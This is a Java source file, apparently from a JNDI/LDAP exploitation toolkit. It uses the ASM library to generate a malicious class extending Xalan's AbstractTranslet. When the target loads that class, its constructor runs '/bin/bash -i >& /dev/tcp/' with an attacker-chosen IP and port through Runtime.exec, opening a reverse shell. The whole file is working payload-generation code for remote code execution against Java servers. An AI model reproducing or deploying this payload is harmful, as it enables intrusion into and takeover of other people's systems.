package com.feihong.ldap.template;

import com.feihong.ldap.utils.Cache;
import com.feihong.ldap.utils.Util;
import org.objectweb.asm.*;
import static org.objectweb.asm.Opcodes.*;

public class ReverseShellTemplate implements Template {
    private String className;
    private byte[] bytes;
    private String ip;
    private int port;

    public ReverseShellTemplate(String ip, String port){
        this(ip, Integer.parseInt(port));
    }


    public ReverseShellTemplate(String ip, int port){
        this.ip = ip;
        this.port = port;
        this.className = "Exploit" + Util.getRandomString();

        generate();
    }

    public ReverseShellTemplate(String ip, String port, String className){
        this(ip, Integer.parseInt(port));
        this.className = className;

        generate();
    }

    @Override
    public String getClassName(){
        return className;
    }

    @Override
    public byte[] getBytes() {
        return bytes;
    }

    @Override
    public void cache() {
        Cache.set(className, bytes);
    }

    @Override
    public void generate() {
        ClassWriter cw = new ClassWriter(0);
        FieldVisitor fv;
        MethodVisitor mv;
        AnnotationVisitor av0;

        cw.visit(V1_6, ACC_PUBLIC + ACC_SUPER, className, null, "com/sun/org/apache/xalan/internal/xsltc/runtime/AbstractTranslet", null);


        {
            fv = cw.visitField(ACC_PRIVATE, "ip", "Ljava/lang/String;", null, null);
            fv.visitEnd();
        }
        {
            fv = cw.visitField(ACC_PRIVATE, "port", "I", null, null);
            fv.visitEnd();
        }
        {
            mv = cw.visitMethod(ACC_PUBLIC, "<init>", "()V", null, null);
            mv.visitCode();
            Label l0 = new Label();
            Label l1 = new Label();
            Label l2 = new Label();
            mv.visitTryCatchBlock(l0, l1, l2, "java/lang/Exception");
            Label l3 = new Label();
            mv.visitLabel(l3);
            mv.visitLineNumber(12, l3);
            mv.visitVarInsn(ALOAD, 0);
            mv.visitMethodInsn(INVOKESPECIAL, "com/sun/org/apache/xalan/internal/xsltc/runtime/AbstractTranslet", "<init>", "()V", false);
            Label l4 = new Label();
            mv.visitLabel(l4);
            mv.visitLineNumber(13, l4);
            mv.visitFieldInsn(GETSTATIC, "java/io/File", "separator", "Ljava/lang/String;");
            mv.visitLdcInsn("/");
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/String", "equals", "(Ljava/lang/Object;)Z", false);
            Label l5 = new Label();
            mv.visitJumpInsn(IFEQ, l5);
            Label l6 = new Label();
            mv.visitLabel(l6);
            mv.visitLineNumber(14, l6);
            mv.visitInsn(ICONST_3);
            mv.visitTypeInsn(ANEWARRAY, "java/lang/String");
            mv.visitInsn(DUP);
            mv.visitInsn(ICONST_0);
            mv.visitLdcInsn("/bin/bash");
            mv.visitInsn(AASTORE);
            mv.visitInsn(DUP);
            mv.visitInsn(ICONST_1);
            mv.visitLdcInsn("-c");
            mv.visitInsn(AASTORE);
            mv.visitInsn(DUP);
            mv.visitInsn(ICONST_2);
            mv.visitLdcInsn("/bin/bash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1");
            mv.visitInsn(AASTORE);
            mv.visitVarInsn(ASTORE, 1);
            mv.visitLabel(l0);
            mv.visitLineNumber(16, l0);
            mv.visitMethodInsn(INVOKESTATIC, "java/lang/Runtime", "getRuntime", "()Ljava/lang/Runtime;", false);
            mv.visitVarInsn(ALOAD, 1);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Runtime", "exec", "([Ljava/lang/String;)Ljava/lang/Process;", false);
            mv.visitInsn(POP);
            mv.visitLabel(l1);
            mv.visitLineNumber(19, l1);
            mv.visitJumpInsn(GOTO, l5);
            mv.visitLabel(l2);
            mv.visitLineNumber(17, l2);
            mv.visitFrame(Opcodes.F_FULL, 2, new Object[]{className, "[Ljava/lang/String;"}, 1, new Object[]{"java/lang/Exception"});
            mv.visitVarInsn(ASTORE, 2);
            Label l7 = new Label();
            mv.visitLabel(l7);
            mv.visitLineNumber(18, l7);
            mv.visitVarInsn(ALOAD, 2);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Exception", "printStackTrace", "()V", false);
            mv.visitLabel(l5);
            mv.visitLineNumber(22, l5);
            mv.visitFrame(Opcodes.F_CHOP, 1, null, 0, null);
            mv.visitInsn(RETURN);
            Label l8 = new Label();
            mv.visitLabel(l8);
            mv.visitLocalVariable("e", "Ljava/lang/Exception;", null, l7, l5, 2);
            mv.visitLocalVariable("command", "[Ljava/lang/String;", null, l0, l5, 1);
            mv.visitLocalVariable("this", "LReverseShell;", null, l3, l8, 0);
            mv.visitMaxs(4, 3);
            mv.visitEnd();
        }
        {
            mv = cw.visitMethod(ACC_PUBLIC, "transform", "(Lcom/sun/org/apache/xalan/internal/xsltc/DOM;[Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;)V", null, new String[]{"com/sun/org/apache/xalan/internal/xsltc/TransletException"});
            mv.visitCode();
            Label l0 = new Label();
            mv.visitLabel(l0);
            mv.visitLineNumber(27, l0);
            mv.visitInsn(RETURN);
            Label l1 = new Label();
            mv.visitLabel(l1);
            mv.visitLocalVariable("this", "LReverseShell;", null, l0, l1, 0);
            mv.visitLocalVariable("document", "Lcom/sun/org/apache/xalan/internal/xsltc/DOM;", null, l0, l1, 1);
            mv.visitLocalVariable("handlers", "[Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;", null, l0, l1, 2);
            mv.visitMaxs(0, 3);
            mv.visitEnd();
        }
        {
            mv = cw.visitMethod(ACC_PUBLIC, "transform", "(Lcom/sun/org/apache/xalan/internal/xsltc/DOM;Lcom/sun/org/apache/xml/internal/dtm/DTMAxisIterator;Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;)V", null, new String[]{"com/sun/org/apache/xalan/internal/xsltc/TransletException"});
            mv.visitCode();
            Label l0 = new Label();
            mv.visitLabel(l0);
            mv.visitLineNumber(32, l0);
            mv.visitInsn(RETURN);
            Label l1 = new Label();
            mv.visitLabel(l1);
            mv.visitLocalVariable("this", "LReverseShell;", null, l0, l1, 0);
            mv.visitLocalVariable("document", "Lcom/sun/org/apache/xalan/internal/xsltc/DOM;", null, l0, l1, 1);
            mv.visitLocalVariable("iterator", "Lcom/sun/org/apache/xml/internal/dtm/DTMAxisIterator;", null, l0, l1, 2);
            mv.visitLocalVariable("handler", "Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;", null, l0, l1, 3);
            mv.visitMaxs(0, 4);
            mv.visitEnd();
        }
        cw.visitEnd();
        bytes = cw.toByteArray();
    }

}
